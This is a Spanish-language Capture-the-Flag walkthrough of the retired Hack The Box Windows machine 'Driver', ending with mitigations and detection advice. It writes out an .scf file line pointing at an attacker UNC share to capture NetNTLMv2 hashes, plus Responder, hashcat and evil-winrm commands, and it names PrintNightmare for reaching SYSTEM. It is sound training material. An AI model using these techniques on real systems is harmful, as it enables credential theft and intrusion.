---
machine: Driver
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, scf, responder, ntlm, winrm, printnightmare]
---

# Driver — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un portal con un gestor de tickets acepta un archivo `.scf` que apunta a un recurso UNC. Al abrirlo, Windows envía un hash NetNTLMv2 a Responder; el hash se crackea y permite WinRM. La versión de Windows es vulnerable a PrintNightmare y permite obtener SYSTEM.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p80,135,139,445,5985 <IP>
```

- IIS, SMB, RPC y WinRM.
- El portal permite adjuntar archivos a tickets.
- El servidor filtra la versión de Windows.

## Enumeración

- Se prueba a subir un `.scf` con `IconFile=\\<ATTACKER>\share\icon.ico`.
- Responder escucha en la interfaz del laboratorio.
- El servidor solicita el recurso y envía el hash NetNTLMv2.
- El hash se crackea con una wordlist y se valida contra WinRM.

## Foothold

Se sube el archivo, se espera la conexión y se captura el hash. Con la contraseña recuperada se accede por WinRM como el usuario del servicio.

```bash
responder -I <IFACE> -wv
hashcat -m 5600 hash.txt <WORDLIST>
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```

## Escalada de privilegios

Se comprueba la versión y el estado del spooler. PrintNightmare permite cargar un driver y ejecutar código como SYSTEM con las credenciales obtenidas.

```powershell
Get-Service Spooler
whoami /priv
```

## Evidencia

- Archivo `.scf` aceptado.
- Hash NetNTLMv2 capturado.
- Sesión WinRM.
- Ejecución como SYSTEM mediante PrintNightmare.

## Lecciones aprendidas

- Los archivos con rutas UNC filtran hashes al abrirse.
- Un portal de tickets es una superficie de carga.
- NetNTLMv2 se puede crackear si la contraseña es débil.
- PrintNightmare sigue presente en sistemas sin parchear.

## Mitigaciones y detección

- Bloquear archivos `.scf` y rutas UNC salientes.
- Aplicar parches de PrintNightmare y deshabilitar el spooler si no se usa.
- Usar credenciales gestionadas y contraseñas largas.
- Alertar de conexiones SMB a hosts externos desde servidores.
- Referencias: CVE-2021-1675, CVE-2021-34527, HTB Driver.

## Referencias

- <https://www.hackthebox.com/machines/Driver>
- <https://nvd.nist.gov/vuln/detail/CVE-2021-34527>
- <https://attack.mitre.org/techniques/T1187/>
- <https://attack.mitre.org/techniques/T1068/>
